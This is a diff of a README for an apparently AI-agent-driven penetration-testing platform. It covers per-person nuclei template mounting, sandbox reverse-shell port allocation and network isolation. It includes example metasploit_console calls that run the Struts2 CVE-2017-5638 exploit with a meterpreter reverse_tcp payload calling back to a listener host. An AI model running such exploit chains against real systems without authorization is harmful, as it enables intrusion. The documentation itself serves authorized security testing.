@@ -245,9 +245,9 @@ execute_nuclei("-u http://10.0.0.5 -t /opt/nuclei-templates/http/misconfiguratio
 
 **Custom Templates:**
 
-The `mcp/nuclei-templates/` directory is mounted read-only at `/opt/nuclei-templates/` inside every sandbox (left out when the folder is empty at the sandbox's start). At startup, the nuclei server scans this directory and dynamically appends all available template paths (with id, severity, name) to the `execute_nuclei` tool description, so the agent automatically knows what custom templates are available.
+Uploaded templates live in `mcp/nuclei-templates/`, which no sandbox mounts. At each start of a person's sandbox the recon orchestrator copies into it only the templates that person may use, their own uploads and the instance's (never another member's; an admin acting as a member gets the member's), and mounts that copy read-only at `/opt/nuclei-templates/` (left out when it is empty). At startup, the nuclei server scans this directory and dynamically appends all available template paths (with id, severity, name) to the `execute_nuclei` tool description, so the agent automatically knows what custom templates are available.
 
-Templates can be uploaded, viewed, and deleted from the webapp UI (Project Settings → Nuclei → Template Options) via the `/api/nuclei-templates` REST API. Uploaded templates are global (shared across all projects and visible in every person's sandbox). The tool description lists the templates present when the sandbox started, so the agent learns of a new upload at that sandbox's next start (it stops after 20 idle minutes). The public nuclei templates live in the read-only volume `redamon-kali-nuclei-templates` (`/root/nuclei-templates`), refreshed daily by the orchestrator.
+Templates can be uploaded, viewed, and deleted from the webapp UI (Project Settings → Nuclei → Template Options) via the `/api/nuclei-templates` REST API. A sandbox gets its copy, and its tool description lists those templates, when it starts, so the agent learns of a new upload at that sandbox's next start (it stops after 20 idle minutes). See [README.KALI_SANDBOX.md](README.KALI_SANDBOX.md) section 5. The public nuclei templates live in the read-only volume `redamon-kali-nuclei-templates` (`/root/nuclei-templates`), refreshed daily by the orchestrator.
 
 ### Nmap Server (Port 8004)
 
@@ -324,6 +324,10 @@ print(page.content()[:5000])
 
 The `metasploit_console` tool maintains a **single persistent msfconsole process** — module configurations, sessions, and variables persist across calls. Context-aware timeouts automatically adjust based on command type (`run`, `exploit`, or other).
 
+#### The sandbox's reverse-shell port
+
+Each sandbox has one reverse-shell port, `MSF_REVERSE_PORT`: its port from the operator's `KALI_SANDBOX_PORT_POOL`, published on the host at the same number, or `4444` when it has none (then only the person's own tunnel reaches it). Every new msfconsole (a start, a restart, the reset for the next project) runs `setg LPORT <port>` when the port is not 4444, so a module's LPORT defaults to the one port targets reach; a module's own `set LPORT` still wins, as a tunnel's handler needs. All of the person's chats and projects share that port and the one console, and only one handler can listen on it: when a handler cannot bind, the tool's output ends with a `[REDAMON]` note naming the Metasploit job (`jobs -k <id>`) or the other process that holds the port, or saying that the address is not one of the sandbox's. A session is listed under the chat whose command started the handler that caught it.
+
 #### Automatic Session Reset
 
 When a new chat session starts, the agentic orchestrator automatically calls `msf_restart()` on the first `metasploit_console` use. This ensures:
@@ -337,7 +341,7 @@ This happens transparently - the LLM agent doesn't need to call `msf_restart()` 
 ```python
 metasploit_console("search CVE-2017-5638")
 metasploit_console("use exploit/multi/http/struts2_content_type_ognl")
-metasploit_console("set RHOSTS 10.0.0.5; set RPORT 8080; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.10; set LPORT 4444; exploit")
+metasploit_console("set RHOSTS 10.0.0.5; set RPORT 8080; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.10; exploit")  # LPORT: the sandbox's reverse port
 metasploit_console("sessions -l")
 metasploit_console("sessions -i 1")
 ```
@@ -482,12 +486,13 @@ default:
   tunnel manager (`8015`), terminal (`8016`) or ngrok API (`4040`). It sits on
   its own network (`redamon-sbx-<key>`, a `/28` of `10.214.0.0/16`), where the
   only other members are the agent and the capture proxy, so no functionality
-  depends on host reachability. The reverse-shell listener (`MSF_REVERSE_PORT`,
-  `4444` inside the container) is reached from outside only through the
-  person's tunnel, or, when an operator sets `KALI_SANDBOX_PORT_POOL`, through
-  the pool port the orchestrator gives that sandbox (the listener then uses the
-  same number inside; bound on `127.0.0.1` unless the variable names another
-  address).
+  depends on host reachability. A reverse shell reaches the sandbox only
+  through the person's tunnel, which delivers to port `4444` inside it, or, when
+  an operator sets `KALI_SANDBOX_PORT_POOL`, through the pool port the
+  orchestrator gives that sandbox (`MSF_REVERSE_PORT`, the same number inside;
+  bound on `127.0.0.1` unless the variable names another address). A stopped
+  sandbox's pool port stays its person's for `KALI_SANDBOX_PORT_HOLD_HOURS` (24 by
+  default), so a late callback never reaches another person's sandbox meanwhile.
 - **Bearer-token auth.** Every MCP SSE request must carry
   `Authorization: Bearer <token>`, the sandbox's own random `MCP_AUTH_TOKEN`
   (the tunnel manager checks a second, separate one). The agent receives both
